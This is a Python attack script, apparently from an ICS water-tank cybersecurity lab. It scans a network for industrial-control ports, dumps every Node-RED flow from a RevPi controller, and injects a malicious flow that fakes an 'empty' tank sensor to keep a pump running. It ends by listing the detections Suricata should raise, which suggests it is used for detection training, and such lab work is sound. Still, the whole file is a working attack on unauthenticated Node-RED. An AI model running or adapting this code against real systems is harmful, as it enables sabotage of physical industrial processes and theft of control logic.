#!/usr/bin/env python3
"""
ICS Water Tank Lab — Attack Script
===================================
Phase 0 : Port Scan / Reconnaissance  (nmap against 10.10.10.0/24)
Phase 1 : Node-RED REST API Abuse      (flow dump + malicious flow injection)

Target network : 10.10.10.0/24
Target RevPi   : 10.10.10.52:1880

Usage:
    python3 ics_attack.py                  # run both phases
    python3 ics_attack.py --phase recon    # recon only
    python3 ics_attack.py --phase nodered  # Node-RED abuse only
"""

import argparse
import json
import subprocess
import sys
import time
import urllib.request
import urllib.error

# ──────────────────────────────────────────────────────────────────────────────
# CONFIG
# ──────────────────────────────────────────────────────────────────────────────
NETWORK         = "10.10.10.0/24"
NODERED_HOST    = "10.10.10.52"
NODERED_PORT    = 1880
NODERED_URL     = f"http://{NODERED_HOST}:{NODERED_PORT}"


# ──────────────────────────────────────────────────────────────────────────────
# HELPERS
# ──────────────────────────────────────────────────────────────────────────────
def banner(title):
    print("\n" + "=" * 60)
    print(f"  {title}")
    print("=" * 60)

def log(msg):
    print(f"  [*] {msg}")

def success(msg):
    print(f"  [+] {msg}")

def warn(msg):
    print(f"  [!] {msg}")

def http_get(path):
    url = f"{NODERED_URL}{path}"
    req = urllib.request.Request(url, headers={"Accept": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return None, str(e)

def http_post(path, data: dict):
    url = f"{NODERED_URL}{path}"
    payload = json.dumps(data).encode()
    req = urllib.request.Request(
        url, data=payload, method="POST",
        headers={"Content-Type": "application/json", "Accept": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return None, str(e)


# ──────────────────────────────────────────────────────────────────────────────
# PHASE 0 — PORT SCAN / RECONNAISSANCE
# ──────────────────────────────────────────────────────────────────────────────
def phase_recon():
    banner("PHASE 0 — Port Scan / Reconnaissance")

    # Check nmap is available
    try:
        subprocess.run(["nmap", "--version"], capture_output=True, check=True)
    except (subprocess.CalledProcessError, FileNotFoundError):
        warn("nmap not found. Install with: apt install nmap")
        sys.exit(1)

    # Step 1 — Host discovery
    log(f"Step 1: Host discovery on {NETWORK}")
    result = subprocess.run(
        ["nmap", "-sn", NETWORK, "--open"],
        capture_output=True, text=True
    )
    print(result.stdout)

    # Step 2 — Full port scan on revpi-twin
    log(f"Step 2: Full port + service scan on {NODERED_HOST}")
    result = subprocess.run(
        ["nmap", "-sV", "-p-", "--open", "-T4", NODERED_HOST],
        capture_output=True, text=True
    )
    print(result.stdout)

    # Step 3 — Targeted OT port scan (common ICS ports)
    ics_ports = "80,443,502,1880,4840,8080,8443,9200,44818"
    log(f"Step 3: Targeted OT/ICS port scan on {NETWORK}")
    log(f"        Ports: {ics_ports}")
    result = subprocess.run(
        ["nmap", "-sV", f"-p{ics_ports}", "--open", "-T4", NETWORK],
        capture_output=True, text=True
    )
    print(result.stdout)

    success("Reconnaissance complete. Review output above for open ports and services.")


# ──────────────────────────────────────────────────────────────────────────────
# PHASE 1 — NODE-RED REST API ABUSE
# ──────────────────────────────────────────────────────────────────────────────
def phase_nodered():
    banner("PHASE 1 — Node-RED REST API Abuse")

    # ── Step 1: Check Node-RED is reachable ──────────────────────────────────
    log(f"Step 1: Checking Node-RED at {NODERED_URL}")
    status, body = http_get("/")
    if status is None:
        warn(f"Cannot reach Node-RED: {body}")
        sys.exit(1)
    success(f"Node-RED responded with HTTP {status}")
    time.sleep(0.5)

    # ── Step 2: Enumerate installed nodes ────────────────────────────────────
    log("Step 2: Enumerating installed Node-RED modules (GET /nodes)")
    status, body = http_get("/nodes")
    if status == 200:
        try:
            nodes = json.loads(body)
            success(f"Found {len(nodes)} installed node modules:")
            for n in nodes[:10]:  # print first 10
                name = n.get("name") or n.get("id", "unknown")
                print(f"         - {name}")
            if len(nodes) > 10:
                print(f"         ... and {len(nodes) - 10} more")
        except Exception:
            success(f"Response received ({len(body)} bytes)")
    else:
        warn(f"GET /nodes returned HTTP {status}")
    time.sleep(0.5)

    # ── Step 3: Dump all flows (full PLC logic) ───────────────────────────────
    log("Step 3: Dumping all flows (GET /flows) — full PLC logic exfiltration")
    status, body = http_get("/flows")
    if status == 200:
        try:
            flows = json.loads(body)
            flow_count = len(flows)
            success(f"Successfully dumped {flow_count} flow nodes!")
            print(f"\n  --- FLOW DUMP (first 3 nodes) ---")
            for node in flows[:3]:
                print(f"  {json.dumps(node, indent=4)}")
            if flow_count > 3:
                print(f"  ... and {flow_count - 3} more nodes\n")

            # Save full dump to file
            with open("flows_dump.json", "w") as f:
                json.dump(flows, f, indent=2)
            success("Full flow dump saved to: flows_dump.json")
        except Exception as e:
            warn(f"Could not parse flows response: {e}")
    else:
        warn(f"GET /flows returned HTTP {status}")
    time.sleep(0.5)

    # ── Step 4: Inject a malicious flow (fake sensor override) ────────────────
    log("Step 4: Injecting malicious flow — fake sensor override via POST /flows")
    log("        Simulating: attacker overrides tank level sensor to report EMPTY")
    log("        This could trick the PLC logic into running the pump indefinitely.")

    malicious_flow = [
        {
            "id": "attacker-inject-001",
            "type": "inject",
            "name": "[INJECTED] Fake Sensor Override",
            "topic": "tank/level",
            "payload": "0",          # report tank as empty
            "payloadType": "str",
            "repeat": "5",           # every 5 seconds
            "once": True,
            "wires": [["attacker-debug-001"]]
        },
        {
            "id": "attacker-debug-001",
            "type": "debug",
            "name": "[INJECTED] Attacker Debug",
            "active": True,
            "wires": []
        }
    ]

    status, body = http_post("/flows", malicious_flow)
    if status in (200, 201, 204):
        success(f"Malicious flow INJECTED successfully! HTTP {status}")
        success("The fake sensor node is now live inside Node-RED.")
        warn("In a real attack this could cause: pump over-run, tank overflow,")
        warn("or trigger emergency shutdowns depending on PLC logic.")
    elif status == 400:
        warn(f"Flow injection rejected (HTTP 400) — Node-RED may require a valid flow ID format.")
        warn(f"Response: {body[:200]}")
    else:
        warn(f"Flow injection returned HTTP {status}")
        warn(f"Response: {body[:200]}")
    time.sleep(0.5)

    # ── Step 5: Read back flows to confirm injection ──────────────────────────
    log("Step 5: Reading back flows to confirm injection (GET /flows)")
    status, body = http_get("/flows")
    if status == 200:
        try:
            flows = json.loads(body)
            injected = [n for n in flows if "attacker" in n.get("id", "")]
            if injected:
                success(f"Confirmed: {len(injected)} injected node(s) found in active flows!")
            else:
                log("Injected nodes not found in flow list (may have been rejected or overwritten).")
        except Exception:
            pass

    banner("ATTACK COMPLETE")
    print("""
  Summary of actions performed:
  ─────────────────────────────────────────────────────
  Phase 0  Host discovery + service scan on 10.10.10.0/24
           Targeted OT/ICS port scan (Modbus, Node-RED, OPC-UA...)

  Phase 1  GET /nodes   → enumerated installed Node-RED modules
           GET /flows   → exfiltrated full PLC flow logic
           POST /flows  → injected malicious sensor override node
           GET /flows   → confirmed injection in active flows

  Suricata should have flagged:
  ─────────────────────────────────────────────────────
  - Nmap SYN scan signatures
  - Multiple connections to port 1880
  - HTTP GET /flows and /nodes (data exfiltration)
  - HTTP POST /flows (flow injection)
    """)


# ──────────────────────────────────────────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="ICS Water Tank Lab — Attack Script")
    parser.add_argument(
        "--phase",
        choices=["recon", "nodered", "all"],
        default="all",
        help="Which phase to run (default: all)"
    )
    args = parser.parse_args()

    print("""
╔══════════════════════════════════════════════════════════════╗
║         ICS Water Tank Cybersecurity Lab                     ║
║         Attack Script — Docker Environment                   ║
║                                                              ║
║  Target network : 10.10.10.0/24                              ║
║  Target RevPi   : 10.10.10.52:1880 (Node-RED)                ║
╚══════════════════════════════════════════════════════════════╝
    """)

    if args.phase in ("recon", "all"):
        phase_recon()

    if args.phase in ("nodered", "all"):
        phase_nodered()


if __name__ == "__main__":
    main()
